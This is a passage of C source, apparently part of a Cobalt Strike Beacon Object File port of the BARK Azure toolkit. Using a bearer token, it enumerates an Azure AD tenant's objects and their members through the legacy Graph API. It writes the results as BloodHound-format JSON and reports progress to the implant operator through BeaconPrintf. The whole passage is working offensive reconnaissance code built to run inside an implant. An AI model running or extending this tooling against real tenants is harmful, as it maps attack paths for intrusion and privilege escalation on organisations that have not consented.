    if (!hdrWide) return;

    static char pathBuf[2048];
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/%s/%s/%s/%s?api-version=1.6&$top=999",
        tenantId, parentCollection, parentId, childSuffix);
    LPWSTR widePath = MbsToWcs(pathBuf);
    if (!widePath) { HFree(hdrWide); return; }

    static char prefix[512];
    int n;
    if (*emitted == 0)
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            "{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    else
        n = MSVCRT$sprintf_s(prefix, sizeof(prefix),
            ",{\"kind\":\"%s\",\"data\":{\"%s\":[", kind, childCollectionKey);
    if (n > 0) BarkBufAppend(b, prefix, (SIZE_T)n);

    char tenantBase[256];
    MSVCRT$sprintf_s(tenantBase, sizeof(tenantBase), "/%s/", tenantId);
    int childCount = 0;
    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;

    while (1) {
        DWORD status = 0;
        char *resp = HttpRequestWithRetry(L"GET", L"graph.windows.net",
            pathArg, hdrWide, NULL, 0, &status);
        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }
        if (!resp || status >= 400) { if (resp) HFree(resp); break; }

        SIZE_T respLen = MSVCRT$strlen(resp);
        const char *end = resp + respLen;
        const char *vKey = JsonFindKey(resp, end, "\"value\"");
        if (vKey) {
            const char *colon = JsonFindKey(vKey, end, ":");
            if (colon) {
                colon++;
                while (colon < end && (*colon == ' ' || *colon == '\t' ||
                       *colon == '\n' || *colon == '\r')) colon++;
                if (colon < end && *colon == '[') {
                    const char *arrEnd = JsonSkipBalanced(colon, end);
                    if (arrEnd) {
                        const char *p = colon + 1;
                        while (p < arrEnd - 1) {
                            while (p < arrEnd - 1 &&
                                   (*p == ' ' || *p == '\n' || *p == '\r' ||
                                    *p == '\t' || *p == ','))
                                p++;
                            if (p >= arrEnd - 1 || *p != '{') break;
                            const char *itemEnd = JsonSkipBalanced(p, arrEnd);
                            if (!itemEnd) break;

                            if (childCount > 0) BarkBufAppend(b, ",", 1);

                            /* Emit: {"<parentIdKey>":"<id>","<childSingularKey>": */
                            static char ep[512];
                            int epn = MSVCRT$sprintf_s(ep, sizeof(ep),
                                "{\"%s\":\"", parentIdKey);
                            if (epn > 0) BarkBufAppend(b, ep, (SIZE_T)epn);
                            BarkBufAppendAsciiUpper(b, parentId,
                                MSVCRT$strlen(parentId));
                            epn = MSVCRT$sprintf_s(ep, sizeof(ep),
                                "\",\"%s\":", childSingularKey);
                            if (epn > 0) BarkBufAppend(b, ep, (SIZE_T)epn);

                            /* Emit minimal member object: @odata.type, createdDateTime,
                             * displayName, id (renamed from objectId) */
                            {
                                char *createdDt   = JsonExtractStringValue(p, itemEnd, "\"createdDateTime\"");
                                char *displayName = JsonExtractStringValue(p, itemEnd, "\"displayName\"");
                                char *memberId    = JsonExtractStringValue(p, itemEnd, "\"objectId\"");
                                static char mbuf[2048];
                                int mn = MSVCRT$sprintf_s(mbuf, sizeof(mbuf),
                                    "{\"@odata.type\":\"#microsoft.graph.user\",\"createdDateTime\":\"%s\","
                                    "\"displayName\":\"%s\",\"id\":\"",
                                    SAFE_STR(createdDt),
                                    SAFE_STR(displayName));
                                if (mn > 0) BarkBufAppend(b, mbuf, (SIZE_T)mn);
                                BarkBufAppendAsciiUpper(b, SAFE_STR(memberId),
                                    MSVCRT$strlen(SAFE_STR(memberId)));
                                BarkBufAppend(b, "\"}", 2);
                                if (createdDt)   HFree(createdDt);
                                if (displayName) HFree(displayName);
                                if (memberId)    HFree(memberId);
                            }
                            BarkBufAppend(b, "}", 1); /* close the child wrapper */
                            childCount++;
                            p = itemEnd;
                        }
                    }
                }
            }
        }
        nextUrl = JsonExtractNextLink(resp, end);
        HFree(resp);
        if (!nextUrl) break;
        nextWide = BarkResolveNextLink(nextUrl, L"graph.windows.net", tenantBase);
        if (!nextWide) break;
        pathArg = nextWide;
    }

    static char sfx[512];
    int sn = MSVCRT$sprintf_s(sfx, sizeof(sfx),
        "],\"%s\":\"", parentIdKey);
    if (sn > 0) BarkBufAppend(b, sfx, (SIZE_T)sn);
    BarkBufAppendAsciiUpper(b, parentId, MSVCRT$strlen(parentId));
    BarkBufAppend(b, "\"}}", 3);
    (*emitted)++;

    HFree(hdrWide);
    HFree(widePath);
    if (nextUrl)  HFree(nextUrl);
    if (nextWide) HFree(nextWide);
}

/* Grouped-by-parent legacy BH emitter for AAD Graph.
 * If parentId is non-NULL, only that parent is queried.
 * If parentId is NULL, all parents are auto-enumerated via objectId. */
static void BarkGetBHGraphGroupedLegacy(const char *bearerToken,
                                         const char *tenantId,
                                         const char *parentCollection,
                                         const char *parentId,
                                         const char *childSuffix,
                                         const char *kind,
                                         const char *parentIdKey,
                                         const char *childCollectionKey,
                                         const char *childSingularKey) {
    BarkIdList ids;
    BarkIdListInit(&ids);
    int ownsList = 0;

    if (parentId && MSVCRT$strlen(parentId) > 0) {
        BarkIdListAppend(&ids, (char *)parentId);
    } else {
        ownsList = 1;
        char parentPath[512];
        MSVCRT$sprintf_s(parentPath, sizeof(parentPath),
            "/%s/%s?api-version=1.6&$top=999", tenantId, parentCollection);
        ids = BarkEnumEntityIds(
            L"graph.windows.net", parentPath, bearerToken, "\"objectId\"");

        if (ids.count == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] No %s found\n", parentCollection);
            BarkIdListFree(&ids);
            return;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Found %d %s, enumerating %s...\n", ids.count, parentCollection, childSuffix);

    BarkBuf b = { NULL, 0, 0, 1 };
    BarkBufAppend(&b, "{\"data\":[", 9);
    int emitted = 0;
    int ei;

    for (ei = 0; ei < ids.count; ei++) {
        EmitGroupedChildrenLegacy(&b, bearerToken, tenantId,
            parentCollection, ids.ids[ei], childSuffix, kind,
            parentIdKey, childCollectionKey, childSingularKey,
            &emitted);
    }

    char tail[128];
    int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d}}", emitted);
    if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

    if (b.ok && b.buf) {
        SYSTEMTIME st;
        KERNEL32$GetLocalTime(&st);
        const char *kindShort = kind;
        if (kindShort[0] == 'A' && kindShort[1] == 'Z') kindShort += 2;
        char filename[300];
        MSVCRT$sprintf_s(filename, sizeof(filename),
            ".\\AZ%s_%04u%02u%02u_%02u%02u%02u.json",
            kindShort,
            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
            (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond);
        BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK %s found %d objects across %d %s\n",
                kind, emitted, ids.count, parentCollection);
        BarkWriteOutput(filename, b.buf, (DWORD)b.len);
    }
    BarkBufFree(&b);
    if (ownsList)
        BarkIdListFree(&ids);
}

#endif /* _BARK_HTTP_UTILS_H_ */
